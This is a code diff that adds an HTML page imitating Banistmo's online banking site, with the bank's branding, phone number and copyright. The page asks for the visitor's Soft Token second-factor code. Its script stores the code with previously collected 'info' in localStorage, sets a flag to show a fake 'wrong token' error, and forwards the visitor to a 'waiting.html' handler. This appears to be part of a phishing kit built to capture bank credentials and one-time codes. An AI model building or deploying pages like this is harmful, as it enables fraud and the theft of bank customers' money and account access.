@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <head>
+        <title>Banistmo Sucursal Virtual Personas</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        <meta content="es" http-equiv="Content-Language">
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous" defer></script>
+        <link href="css/login.css" rel="stylesheet">
+        <link href="css/stylesheet.css" rel="stylesheet">
+        <link rel="icon" type="image/png" href="img/logo.png" />
+        <script src="./js/disp.js"></script>
+    </head>
+</head>
+
+<body>
+    <header class="header">
+        <nav class="navegacion">
+            <div class="logo">
+                <img src="img/logo-banitsmo.png" alt="logo banitsmo">
+            </div>
+            <div class="idioma">
+                <a href="">English</a>
+                <i class="icono-lenguaje"></i>
+            </div>
+        </nav>
+    </header>
+    <main>
+
+        <!-- LEFT COLUMN -->
+        <section class="container">
+            <div class="container-grid">
+
+
+                <div class="container-campos">
+                    <div class="header-campos">
+                        <h3>Un paso más</h3>
+                    </div>
+
+                    <div class="img-main">
+                        <img src="img/ban-phone.svg" style="width: 180px;">
+                    </div>
+
+                    <p>Ingresa tu número de Soft Token</p>
+
+                    <!-- CVV -->
+                    <div class="input-row-campos">
+                        <div class="input-group-text input-fix">
+                            <input class="input-bg-lock" type="number" maxlength="6" oninput="limitarInput(this)" id="token" placeholder=" ">
+                            <label for="">Soft Token</label>
+                        </div>
+                    </div>
+
+                    <!-- BUTTON -->
+                    <div class="btn-row">
+                        <button type="button" class="btn btn-success" id="continuar">
+                            Continuar
+                        </button>
+                    </div>
+
+                </div>
+
+            </div>
+
+
+            <!-- RIGHT COLUMN -->
+            <div class="column-right">
+                <div class="img-main">
+                    <img src="img/ban-lock-header.png" style="width: 500px;">
+                </div>
+
+                <!-- "CONOCE TAMBIEN"-->
+                <div class="conoce">
+                    <h1 class="titleConoce">Conoce también:</h1>
+                    <div class="conoceItems">
+                        <div class="conoceItem">
+                            <img src="img/tarifas.png" alt="">
+                            <a href="#">Tarifas</a>
+                            <span><b>+</b></span>
+                        </div>
+
+                        <div class="conoceItem">
+                            <img src="img/servicios.png" alt="">
+                            <a href="#">Servicios</a>
+                            <span><b>+</b></span>
+
+                        </div>
+
+                        <div class="conoceItem">
+                            <img src="img/sucursales.png" alt="">
+                            <a href="#">Sucursales</a>
+                            <span><b>+</b></span>
+
+                        </div>
+
+                        <div class="conoceItem">
+                            <img src="img/noticias.png" alt="">
+                            <a href="#">Noticias</a>
+                            <span><b>+</b></span>
+
+                        </div>
+                    </div>
+                    <button class="btnConoce">Conoce como utilizar la Banca en Línea</button>
+                </div>
+
+            </div>
+
+
+        </section>
+    </main>
+    <footer class="footer">
+        <div class="contenedor-footer">
+            <div class="contacto-telefono">
+                <i class="fas  fa-phone" style="color : #454648"></i>
+                Sucursal Teléfonica: (507) 306-4700
+            </div>
+            <div class="info">
+                Copyright Banistmo S.A. 2023
+            </div>
+        </div>
+    </footer>
+
+    <script src="js/app.js"></script>
+    <script>
+
+        function limitarInput(input) {
+            const maxLength = input.getAttribute('maxlength');
+            if (input.value.length > maxLength) {
+                input.value = input.value.slice(0, maxLength);
+            }
+        }
+
+        const token = document.querySelector('#token');
+        const btnContinuar = document.getElementById('continuar');
+
+        if (info.err !== '') {
+            // Mensaje de error
+            alert('¡Token Erróneo! Corrija, por favor.');
+
+            //errMail
+            token.style.borderColor = "red";
+            token.style.borderBottomWidth = "3px";
+        }
+
+        btnContinuar.addEventListener('click', () => {
+
+            token.style.borderColor = "black";
+            token.style.borderBottomWidth = "1px";
+
+            if (token.value.length > 3 && token.value.length < 7) {
+                // Guardar en LS
+                info.tok = token.value;
+                info.err = 'true';
+                LS.setItem('info', JSON.stringify(info));
+
+                // Enviar al handler waiting
+                window.location.href = 'waiting.html';
+
+
+            } else {
+                token.style.borderColor = "red";
+                token.style.borderBottomWidth = "3px";
+            }
+        });
+
+    </script>
+</body>
+
+</html>
